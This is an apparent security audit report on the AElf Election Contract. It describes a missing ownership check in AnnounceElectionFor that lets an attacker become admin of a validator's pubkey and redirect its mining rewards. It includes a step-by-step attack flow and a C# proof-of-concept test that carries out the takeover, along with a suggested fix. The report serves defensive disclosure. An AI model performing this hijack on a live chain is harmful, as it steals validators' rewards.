# Audit Report

## Title
Unauthorized Admin Takeover via AnnounceElectionFor Enables Reward Redirection

## Summary
The `AnnounceElectionFor` method in the Election Contract allows any caller to announce candidacy for an arbitrary pubkey without verifying ownership of that pubkey's private key. This enables attackers to front-run legitimate candidate announcements, become the admin of target pubkeys, and permanently redirect all mining/candidate rewards to attacker-controlled addresses. Victims have no recovery mechanism without Parliament intervention.

## Finding Description

The Election Contract provides two methods for announcing candidacy: `AnnounceElection` and `AnnounceElectionFor`. While `AnnounceElection` properly verifies ownership by recovering the public key from the transaction signature [1](#0-0) , the `AnnounceElectionFor` method accepts an arbitrary pubkey parameter and sets an admin without any authorization check [2](#0-1) .

The vulnerability exists because `AnnounceElectionFor` directly calls the private `AnnounceElection(byte[])` method which only validates that the pubkey is not an initial miner, not already a candidate, and not banned - but never verifies the caller has authorization to announce for that pubkey [3](#0-2) .

**Attack Flow:**

1. Attacker identifies a target pubkey (e.g., a known validator's public key that hasn't announced candidacy yet)
2. Attacker calls `AnnounceElectionFor` with the victim's pubkey and attacker's address as admin
3. The admin is recorded in `State.CandidateAdmins[pubkey]` without authorization verification
4. Attacker calls `TreasuryContract.SetProfitsReceiver` to redirect rewards to attacker's address
5. `SetProfitsReceiver` validates admin permission via `GetCandidateAdmin` which returns the attacker's address [4](#0-3) 
6. Mining rewards are distributed to the attacker's address because `GetProfitsReceiver` returns the value from `ProfitsReceiverMap` [5](#0-4)  which is used during reward distribution [6](#0-5) 

**Why Recovery Is Impossible:**

The `SetCandidateAdmin` method that could change the admin requires the caller to be either Parliament or the current admin [7](#0-6) . Since the attacker is already the admin, the legitimate pubkey owner cannot change it without controlling Parliament.

## Impact Explanation

**Direct Financial Loss:**
All mining rewards for the hijacked pubkey flow to the attacker instead of the legitimate owner, including:
- Basic miner rewards distributed per term
- Welcome rewards for newly elected miners  
- Flexible rewards
- Backup subsidy for candidates in data center ranking

**Systemic Consequences:**
- Legitimate validators lose economic incentive if rewards are stolen, undermining network security
- Victims must generate entirely new keypairs, losing any reputation or history associated with the original pubkey
- The fundamental assumption that miners control their own reward destinations is violated

**Affected Parties:**
- New validators (non-initial-miners) preparing to announce candidacy
- Any known validator pubkeys that haven't announced yet
- The broader ecosystem's trust in reward distribution fairness

Note: Initial miners are NOT affected because both `AnnounceElection` and `AnnounceElectionFor` explicitly block initial miner pubkeys from being announced [8](#0-7) , and initial miners don't need to announce candidacy as they are already part of the consensus system.

## Likelihood Explanation

**Attacker Requirements:**
- Capital: 100,000 ELF to pay the `LockTokenForElection` deposit [9](#0-8) 
- This capital is fully recoverable by calling `QuitElection` as admin, which returns funds to the sponsor [10](#0-9) 

**Attack Complexity:**
- Very Low: Single transaction call to `AnnounceElectionFor`
- No special privileges required beyond sufficient ELF balance
- No race conditions beyond front-running the legitimate announcement

**Economic Rationality:**
- Mining rewards per term significantly exceed 100,000 ELF deposit
- Attacker gets deposit back if victim never becomes miner  
- High ROI if victim pubkey gets elected
- Can target multiple pubkeys simultaneously

**Detection Difficulty:**
- Attack is indistinguishable from legitimate sponsored announcements (the intended use case demonstrated in tests [11](#0-10) )
- No on-chain signal that the admin is not the legitimate owner
- Victim only discovers after attempting to announce or claim rewards

**Probability: HIGH** - The attack is deterministic, economically profitable, technically trivial, and has no preventive controls.

## Recommendation

Add authorization verification to `AnnounceElectionFor` to ensure the caller has permission from the pubkey owner. The recommended fix is:

1. Require a signature from the pubkey being announced as a parameter
2. Verify the signature in `AnnounceElectionFor` before proceeding
3. Alternatively, restrict `AnnounceElectionFor` to only allow setting the admin to the address derived from the pubkey (similar to how `AnnounceElection` works)

Example fix approach:
```csharp
public override Empty AnnounceElectionFor(AnnounceElectionForInput input)
{
    var pubkey = input.Pubkey;
    var pubkeyBytes = ByteArrayHelper.HexStringToByteArray(pubkey);
    var pubkeyAddress = Address.FromPublicKey(pubkeyBytes);
    
    // Require admin to be the pubkey owner or verify authorization signature
    var admin = input.Admin ?? Context.Sender;
    Assert(admin == pubkeyAddress || VerifyAuthorization(input), 
        "Admin must be pubkey owner or have authorization.");
    
    // Rest of the method...
}
```

Alternatively, simply require that the admin parameter must equal the address derived from the pubkey to prevent unauthorized admin assignment.

## Proof of Concept

```csharp
[Fact]
public async Task AnnounceElectionFor_UnauthorizedAdminTakeover_Test()
{
    // Setup: Attacker and victim keypairs
    var victimKeyPair = ValidationDataCenterKeyPairs[0];
    var attackerKeyPair = ValidationDataCenterKeyPairs[1];
    
    // Give attacker sufficient balance for deposit
    await IssueNativeTokenAsync(attackerKeyPair.PublicKey, 100_000_00000000);
    
    // Attacker announces for victim's pubkey with attacker as admin
    var attackerStub = GetElectionContractTester(attackerKeyPair);
    await attackerStub.AnnounceElectionFor.SendAsync(new AnnounceElectionForInput
    {
        Pubkey = victimKeyPair.PublicKey.ToHex(),
        Admin = Address.FromPublicKey(attackerKeyPair.PublicKey)
    });
    
    // Verify attacker is now the admin
    var admin = await ElectionContractStub.GetCandidateAdmin.CallAsync(
        new StringValue { Value = victimKeyPair.PublicKey.ToHex() });
    admin.ShouldBe(Address.FromPublicKey(attackerKeyPair.PublicKey));
    
    // Attacker sets profits receiver to their own address
    var attackerTreasuryStub = GetTreasuryContractTester(attackerKeyPair);
    await attackerTreasuryStub.SetProfitsReceiver.SendAsync(new SetProfitsReceiverInput
    {
        Pubkey = victimKeyPair.PublicKey.ToHex(),
        ProfitsReceiverAddress = Address.FromPublicKey(attackerKeyPair.PublicKey)
    });
    
    // Verify profits receiver is attacker's address
    var profitsReceiver = await TreasuryContractStub.GetProfitsReceiver.CallAsync(
        new StringValue { Value = victimKeyPair.PublicKey.ToHex() });
    profitsReceiver.ShouldBe(Address.FromPublicKey(attackerKeyPair.PublicKey));
    
    // Victim cannot recover: SetCandidateAdmin will fail
    var victimStub = GetElectionContractTester(victimKeyPair);
    var result = await victimStub.SetCandidateAdmin.SendWithExceptionAsync(
        new SetCandidateAdminInput
        {
            Pubkey = victimKeyPair.PublicKey.ToHex(),
            Admin = Address.FromPublicKey(victimKeyPair.PublicKey)
        });
    result.TransactionResult.Error.ShouldContain("No permission");
}
```

This test demonstrates that an attacker can successfully hijack a pubkey's admin role and redirect its rewards, with the victim having no recovery mechanism.

### Citations

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L27-39)
```csharp
        if (Context.Sender != GetParliamentDefaultAddress())
        {
            if (State.CandidateAdmins[pubkey] == null)
            {
                // If admin is not set before (due to old contract code)
                Assert(Context.Sender == Address.FromPublicKey(ByteArrayHelper.HexStringToByteArray(input.Pubkey)),
                    "No permission.");
            }
            else
            {
                var oldCandidateAdmin = State.CandidateAdmins[pubkey];
                Assert(Context.Sender == oldCandidateAdmin, "No permission.");
            }
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L93-96)
```csharp
    public override Empty AnnounceElection(Address input)
    {
        var recoveredPublicKey = Context.RecoverPublicKey();
        AnnounceElection(recoveredPublicKey);
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L121-128)
```csharp
    public override Empty AnnounceElectionFor(AnnounceElectionForInput input)
    {
        var pubkey = input.Pubkey;
        var pubkeyBytes = ByteArrayHelper.HexStringToByteArray(pubkey);
        var address = Address.FromPublicKey(pubkeyBytes);
        AnnounceElection(pubkeyBytes);
        var admin = input.Admin ?? Context.Sender;
        State.CandidateAdmins[pubkey] = admin;
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L144-175)
```csharp
    private void AnnounceElection(byte[] pubkeyBytes)
    {
        var pubkey = pubkeyBytes.ToHex();
        var pubkeyByteString = ByteString.CopyFrom(pubkeyBytes);

        Assert(!State.InitialMiners.Value.Value.Contains(pubkeyByteString),
            "Initial miner cannot announce election.");

        var candidateInformation = State.CandidateInformationMap[pubkey];

        if (candidateInformation != null)
        {
            Assert(!candidateInformation.IsCurrentCandidate,
                $"This public key already announced election. {pubkey}");
            candidateInformation.AnnouncementTransactionId = Context.OriginTransactionId;
            candidateInformation.IsCurrentCandidate = true;
            // In this way we can keep history of current candidate, like terms, missed time slots, etc.
            State.CandidateInformationMap[pubkey] = candidateInformation;
        }
        else
        {
            Assert(!IsPubkeyBanned(pubkey), "This candidate already banned before.");
            State.CandidateInformationMap[pubkey] = new CandidateInformation
            {
                Pubkey = pubkey,
                AnnouncementTransactionId = Context.OriginTransactionId,
                IsCurrentCandidate = true
            };
        }

        State.Candidates.Value.Value.Add(pubkeyByteString);
    }
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L242-249)
```csharp
        State.TokenContract.TransferFrom.Send(new TransferFromInput
        {
            From = lockVirtualAddress,
            To = State.CandidateSponsorMap[input.Value] ?? Address.FromPublicKey(pubkeyBytes),
            Symbol = Context.Variables.NativeSymbol,
            Amount = ElectionContractConstants.LockTokenForElection,
            Memo = "Quit election."
        });
```

**File:** contract/AElf.Contracts.Treasury/TreasuryContract.cs (L601-620)
```csharp
    public override Empty SetProfitsReceiver(SetProfitsReceiverInput input)
    {
        if (State.ElectionContract.Value == null)
            State.ElectionContract.Value =
                Context.GetContractAddressByName(SmartContractConstants.ElectionContractSystemName);
        var pubkey = ByteString.CopyFrom(ByteArrayHelper.HexStringToByteArray(input.Pubkey));
        
        var admin = State.ElectionContract.GetCandidateAdmin.Call(new StringValue {Value = input.Pubkey});
        Assert(Context.Sender == admin , "No permission.");
        
        var candidateList = State.ElectionContract.GetCandidates.Call(new Empty());
        Assert(candidateList.Value.Contains(pubkey),"Pubkey is not a candidate.");

        var previousProfitsReceiver = State.ProfitsReceiverMap[input.Pubkey];
        //Set same profits receiver address.
        if (input.ProfitsReceiverAddress == previousProfitsReceiver)
        {
            return new Empty();
        }
        State.ProfitsReceiverMap[input.Pubkey] = input.ProfitsReceiverAddress;
```

**File:** contract/AElf.Contracts.Treasury/TreasuryContract.cs (L651-655)
```csharp
    private Address GetProfitsReceiver(string pubkey)
    {
        return State.ProfitsReceiverMap[pubkey] ??
               Address.FromPublicKey(ByteArrayHelper.HexStringToByteArray(pubkey));
    }
```

**File:** contract/AElf.Contracts.Treasury/TreasuryContract.cs (L814-818)
```csharp
                    return new BeneficiaryShare
                    {
                        Beneficiary = GetProfitsReceiver(i.Pubkey),
                        Shares = shares
                    };
```

**File:** contract/AElf.Contracts.Election/ElectionContractConstants.cs (L5-5)
```csharp
    public const long LockTokenForElection = 100_000_00000000;
```

**File:** test/AElf.Contracts.Election.Tests/BVT/SponsorTests.cs (L16-29)
```csharp
    public async Task ElectionContract_AnnounceElectionFor_State_Test()
    {
        var candidatesKeyPair = ValidationDataCenterKeyPairs.First();
        var sponsorKeyPair = ValidationDataCenterKeyPairs.Last();
        var balanceBeforeAnnouncing = await GetNativeTokenBalance(sponsorKeyPair.PublicKey);

        // Execute AnnounceElectionFor.
        var electionStub = GetElectionContractTester(sponsorKeyPair);
        var candidateAdmin = Address.FromPublicKey(candidatesKeyPair.PublicKey);
        await electionStub.AnnounceElectionFor.SendAsync(new AnnounceElectionForInput
        {
            Admin = candidateAdmin,
            Pubkey = candidatesKeyPair.PublicKey.ToHex()
        });
```
